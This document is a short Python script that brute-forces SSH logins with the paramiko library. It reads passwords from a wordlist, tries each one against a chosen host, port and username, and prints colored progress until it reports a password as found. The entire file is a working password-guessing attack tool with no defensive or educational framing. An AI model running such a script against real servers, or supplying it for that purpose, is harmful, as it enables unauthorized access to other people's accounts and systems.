from os import name
import paramiko
from colorama import Fore, Style
import socket
def bruteforce(wordlist_path="wordlist.txt",host="localhost",port=22,username="ivan"):
    file = open(wordlist_path, "r")
    line_count = 0
    for line in file:
        if line != "\n":
            line_count += 1
    file.close()
    print(line_count)
    with open(wordlist_path, 'r') as filin:
        all_passwords = filin.readlines()
        counter = 0
        for password in all_passwords:
            password_without_space = password.rstrip()
            print(f"{Fore.YELLOW}[*] Testing :",password_without_space,f" {counter} of {line_count} tested",Style.RESET_ALL)
            try :
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host,port,username,password_without_space)
            except paramiko.ssh_exception.AuthenticationException:
                print(f"{Fore.RED}[-] Not work : ",password_without_space,Style.RESET_ALL)
                counter += 1
            except socket.gaierror :
                print(f"{Fore.RED}[-] Invalide hostname ",Style.RESET_ALL)
                break
            except paramiko.ssh_exception.NoValidConnectionsError:
                print(f"{Fore.RED}[-] Invalide port number ",Style.RESET_ALL)
                break
            except FileNotFoundError:
                print(f"{Fore.RED}[-] The path of the file doesn't exist",Style.RESET_ALL)
                break
            except:
                print((f"{Fore.RED}[-] A error as occured",Style.RESET_ALL))
            else:
                print(f"{Fore.GREEN}[+] Founded : ",password_without_space,Style.RESET_ALL)
                break